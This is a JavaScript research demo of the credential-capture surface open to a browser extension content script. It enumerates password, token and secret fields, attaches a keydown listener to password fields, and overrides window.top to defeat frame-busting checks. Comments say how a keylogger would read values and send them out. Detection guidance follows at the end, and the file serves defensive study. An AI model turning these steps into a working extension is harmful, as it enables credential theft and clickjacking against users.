/**
 * Research: Input Capture via DOM Manipulation (T1056.004)
 *
 * AUTHORIZED RESEARCH ONLY. This script demonstrates the attack surface
 * available to any Chrome extension running a content script on a page.
 * It does NOT capture or transmit values. It demonstrates enumeration
 * and observation — the first two stages of a credential-theft attack.
 *
 * This is what a malicious extension does before it reads .value.
 * Understanding the technique is the prerequisite for detecting it.
 *
 * Reference: https://attack.mitre.org/techniques/T1056/004/
 */

'use strict';

const SENSITIVE_INPUT_SELECTORS = [
    'input[type="password"]',
    'input[type="email"]',
    'input[autocomplete="username"]',
    'input[autocomplete="current-password"]',
    'input[name*="token"]',
    'input[name*="api"]',
    'input[name*="secret"]'
];

/**
 * Stage 1 — Enumeration
 * Identify all credential-adjacent elements on the current page.
 * A malicious extension runs this on every page load across every site
 * because it holds <all_urls> permission and a persistent content script.
 */
function enumerateSensitiveFields() {
    const findings = {};
    for (const selector of SENSITIVE_INPUT_SELECTORS) {
        const matches = [...document.querySelectorAll(selector)];
        if (matches.length) {
            findings[selector] = matches.map(el => ({
                tagName: el.tagName,
                id: el.id || null,
                name: el.name || null,
                form: el.form?.id || el.form?.action || null
                // NOTE: .value is intentionally NOT read here.
                // A malicious extension would add: value: el.value
            }));
        }
    }
    return findings;
}

/**
 * Stage 2 — Observation
 * Attach event listeners to watch for keystrokes in sensitive fields.
 * This is the pattern YARA rule Extension_Input_Capture detects.
 *
 * A defender hunting malicious extensions looks for:
 *   - addEventListener on 'keydown', 'input', or 'change'
 *   - Targeting password or email inputs
 *   - Followed by chrome.runtime.sendMessage or XMLHttpRequest
 *
 * The three calls below are the dangerous ones. They are included for
 * documentation — they are never wired to exfiltration here.
 */
function demonstrateObservationPattern() {
    const passwordFields = document.querySelectorAll('input[type="password"]');

    passwordFields.forEach(field => {
        // This is what a keylogger extension attaches:
        const demoListener = (e) => {
            // Malicious version: chrome.runtime.sendMessage({ key: e.key, field: field.name })
            // This version: logs to console only, no exfil.
            console.log('[RESEARCH DEMO] Keystroke event on password field — value NOT captured');
            console.log('[RESEARCH DEMO] A malicious extension would send this to its background worker.');
            field.removeEventListener('keydown', demoListener); // single-fire only
        };
        field.addEventListener('keydown', demoListener);
    });
}

/**
 * Stage 3 — Frame-Busting Bypass
 * Many web apps attempt to prevent their pages from running inside iframes
 * using JavaScript checks like `if (window.top !== window.self) { ... }`.
 * A content script runs in the page's context with full DOM access, meaning
 * it can override these checks before they execute — or neutralize them after.
 *
 * Technique: replace window.top reference so the check always passes.
 * This enables clickjacking-style attacks even on "frame-busting" pages.
 */
function demonstrateFrameBustBypass() {
    try {
        // Redefine window.top so frame-busting logic sees window === window.top
        Object.defineProperty(window, 'top', {
            get: function () { return window.self; },
            configurable: true
        });
        console.log('[RESEARCH DEMO] Frame-bust bypass active.');
        console.log('[RESEARCH DEMO] window.top === window.self now evaluates true in this frame.');
        console.log('[RESEARCH DEMO] Frame-busting checks ("if top !== self, redirect") are neutralized.');
    } catch (e) {
        console.log('[RESEARCH DEMO] Frame-bust bypass blocked by browser (expected in strict contexts):', e.message);
    }
}

// --- Run demo ---

console.group('[RESEARCH DEMO] DOM Hijack Surface Analysis');
console.log('This demonstrates what any installed content script can observe.');
console.log('No values are read. No data leaves this page.');

const fields = enumerateSensitiveFields();
if (Object.keys(fields).length > 0) {
    console.warn('[RESEARCH DEMO] Sensitive fields enumerated on this page:', fields);
} else {
    console.log('[RESEARCH DEMO] No sensitive fields found on this page.');
}

demonstrateObservationPattern();
demonstrateFrameBustBypass();

console.groupEnd();

/*
    DEFENDER DETECTION GUIDANCE
    ============================
    To detect content scripts performing input capture in your environment:

    1. Chrome Enterprise: Enable ExtensionInstallBlocklist and audit extension
       permissions via Group Policy. Flag any extension requesting <all_urls>
       combined with webRequest or tabs.

    2. EDR telemetry: Look for chrome.exe spawning JavaScript processes that
       call sendMessage with high frequency — consistent with keystroke buffering.

    3. Network monitoring: Credential-stealing extensions typically exfiltrate
       via POST to a domain registered recently (< 30 days), often mimicking
       legitimate CDN names. Flag chrome.exe as the initiating process.

    4. YARA scanning: Use the Extension_Input_Capture rule in security/extension.yar
       to scan installed extension directories at:
         Windows: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\
         macOS:   ~/Library/Application Support/Google/Chrome/Default/Extensions/
*/
